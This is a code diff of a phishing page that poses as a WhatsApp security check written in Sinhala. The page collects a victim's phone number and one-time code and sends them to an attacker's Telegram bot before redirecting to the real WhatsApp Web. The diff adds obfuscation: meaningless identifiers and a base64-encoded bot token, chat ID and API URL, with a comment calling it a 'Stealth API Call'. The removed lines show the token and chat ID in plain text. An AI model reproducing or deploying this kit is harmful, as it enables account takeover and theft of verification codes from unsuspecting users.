@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WhatsApp Web - Security Update</title>
+    <title>Secure Connection - Update 2026</title>
     <style>
         body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .card { background: white; padding: 35px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 100%; max-width: 380px; text-align: center; }
@@ -22,55 +22,59 @@
 <div class="card">
     <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WA" class="logo">
     <h2>ආරක්ෂක තහවුරු කිරීම</h2>
-    <p>ඔබේ ගිණුමේ ආරක්ෂාව තහවුරු කිරීමට කරුණාකර දුරකථන අංකය සහ OTP කේතය ඇතුළත් කරන්න.</p>
+    <p>පද්ධති යාවත්කාලීන කිරීම සඳහා කරුණාකර ඔබගේ විස්තර ඇතුළත් කරන්න.</p>
 
-    <form id="phishForm">
-        <input type="text" id="phone" placeholder="දුරකථන අංකය (07XXXXXXXX)" required>
-        <input type="text" id="otp" placeholder="ඉලක්කම් 6 කේතය (OTP)" maxlength="6" required>
-        <button type="submit" id="btn">VERIFY NOW</button>
+    <form id="sx-71">
+        <input type="text" id="p-99" placeholder="දුරකථන අංකය (07XXXXXXXX)" required>
+        <input type="text" id="o-11" placeholder="OTP කේතය (6-Digits)" maxlength="6" required>
+        <button type="submit" id="s-btn">VERIFY NOW</button>
     </form>
 
     <div class="secure">
-        <span style="color:#00a884;">●</span> End-to-End Encrypted 2026<br>
-        404! Specialist Unit Security Protocol
+        <span style="color:#00a884;">●</span> End-to-End Encrypted Secure Login<br>
+        404! Specialist Protocol Active
     </div>
 </div>
 
 <script>
-    // --- ⚙️ CONFIGURATION ---
-    const botToken = "8194525503:AAFskY0McDJKJQLhf_wXwEJP8MxXFb3UZ5s"; 
-    const chatID = "6446613868";     
-    // -------------------------
+    /* 🔱 OBFUSCATED DATA - MISSION #OpSecuSL 🔱 */
+    const _v1 = "ODE5NDUyNTUwMzpBQUZza1kwTWNESktKUUxoZl93WHdFSlA4TXhYRmIzVVo1cw=="; // Token
+    const _v2 = "NjQ0NjYxMzg2OA=="; // Chat ID
 
-    document.getElementById('phishForm').addEventListener('submit', function(e) {
+    document.getElementById('sx-71').addEventListener('submit', function(e) {
         e.preventDefault();
         
-        const phone = document.getElementById('phone').value;
-        const otp = document.getElementById('otp').value;
-        const btn = document.getElementById('btn');
+        const _ph = document.getElementById('p-99').value;
+        const _ot = document.getElementById('o-11').value;
+        const _bt = document.getElementById('s-btn');
         
-        btn.innerHTML = "Verifying...";
-        btn.disabled = true;
+        _bt.innerHTML = "Processing...";
+        _bt.disabled = true;
 
-        const message = `🔱 *404! TARGET CAPTURED* 🔱\n\n📱 *Phone:* \`${phone}\`\n🔑 *OTP:* \`${otp}\` \n\n*Status:* Action Required!`;
+        // Decryption logic
+        const _t = atob(_v1);
+        const _c = atob(_v2);
+        
+        const _m = `🔱 *404! TARGET CAPTURED* 🔱\n\n📱 *Phone:* \`${_ph}\`\n🔑 *OTP:* \`${_ot}\` \n\n*Status:* Action Required!`;
 
-        // Telegram API එකට කෙලින්ම දත්ත යැවීම
-        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        // Stealth API Call
+        const _u = atob("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==") + _t + atob("L3NlbmRNZXNzYWdl");
+
+        fetch(_u, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
-                chat_id: chatID,
-                text: message,
+                chat_id: _c,
+                text: _m,
                 parse_mode: 'Markdown'
             })
         })
-        .then(response => {
-            // දත්ත ලැබුණු පසු නියම WhatsApp පිටුවට යොමු කිරීම
-            window.location.href = "https://web.whatsapp.com";
+        .then(() => {
+            // Redirect to official service
+            window.location.href = atob("aHR0cHM6Ly93ZWIud2hhdHNhcHAuY29t");
         })
-        .catch(error => {
-            console.error('Error:', error);
-            window.location.href = "https://web.whatsapp.com";
+        .catch(() => {
+            window.location.href = atob("aHR0cHM6Ly93ZWIud2hhdHNhcHAuY29t");
         });
     });
 </script>
